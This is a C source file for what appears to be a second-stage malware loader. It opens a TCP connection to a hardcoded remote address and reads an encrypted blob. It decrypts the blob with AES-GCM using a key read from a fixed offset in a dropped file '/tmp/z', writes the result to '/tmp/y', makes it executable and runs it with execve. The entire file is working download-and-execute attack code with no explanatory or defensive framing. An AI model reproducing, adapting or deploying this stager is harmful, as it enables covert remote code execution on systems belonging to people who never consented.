#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "aes/gcm.h"
#include "constants.h"

#define NEW_PERMISSIONS (S_IRUSR | S_IWUSR | S_IXUSR)

void read_all(int sock, char *buf, ssize_t size);
void decrypt_and_verify(char *buf, ssize_t size, char *tag);
void write_and_execute(char *buf, ssize_t size, char **envp);

int main(int argc, char *argv[], char **envp) {
    int sock;
    struct sockaddr_in server_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = 0x4343;
    server_addr.sin_addr.s_addr = 0x44444444;

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    char *buffer = malloc(CLIENT_SIZE + 16);
    if (buffer == NULL) {
        printf("Fatal error: not enough memory\n");
        exit(EXIT_FAILURE);
    }

    read_all(sock, buffer, CLIENT_SIZE + 16);

    // Tag is after the payload
    decrypt_and_verify(buffer, CLIENT_SIZE, buffer + CLIENT_SIZE);

    write_and_execute(buffer, CLIENT_SIZE, envp);

    return 0;
}

void read_all(int sock, char *buf, ssize_t size) {
    while (size > 0) {
        ssize_t num_read = read(sock, buf, size);
        if (num_read < 0) {
            perror("Read error");
            exit(EXIT_FAILURE);
        }

        buf += num_read;
        size -= num_read;
    }

    if (size != 0) {
        printf("Fatal error: read the wrong number of bytes\n");
        exit(EXIT_FAILURE);
    }
}

void decrypt_and_verify(char *buf, ssize_t size, char *tag) {
    int fd = open("/tmp/z", O_RDONLY);
    if (fd == -1) {
        perror("opening initial payload");
        exit(EXIT_FAILURE);
    }

    off_t offset = lseek(fd, KEY_OFFSET, SEEK_SET);
    if (offset == -1) {
        perror("seeking to key offset");
        exit(EXIT_FAILURE);
    }

    char key_buf[16];
    char* iv = "IVCANBECONST";

    if (read(fd, key_buf, 16) != 16) {
        printf("Failed to read key from file\n");
        exit(EXIT_FAILURE);
    }

    close(fd);

    gcm_initialize();
    gcm_context ctx;

    gcm_setkey(&ctx, key_buf, 16);
    
    int ret = gcm_auth_decrypt(&ctx, iv, 12, NULL, 0, buf, buf, size, tag, 16);
    if (ret != 0) {
        printf("Decryption failed\n");
        exit(EXIT_FAILURE);
    }
}

void write_and_execute(char *buf, ssize_t size, char **envp) {
    int payload_fd = open("/tmp/y", O_WRONLY | O_CREAT, NEW_PERMISSIONS);

    while (size > 0) {
        ssize_t num_written = write(payload_fd, buf, size);

        if (num_written < 0) {
            perror("Write error");
            exit(EXIT_FAILURE);
        }

        buf += num_written;
        size -= num_written;
    }

    if (size != 0) {
        printf("Fatal error: read the wrong number of bytes\n");
        exit(EXIT_FAILURE);
    }

    close(payload_fd);

    chmod("/tmp/y", NEW_PERMISSIONS);
    char *argv2[] = {"/tmp/y", NULL};
    if (execve("/tmp/y", argv2, envp) == -1) {
        perror("execve failed");
    }
}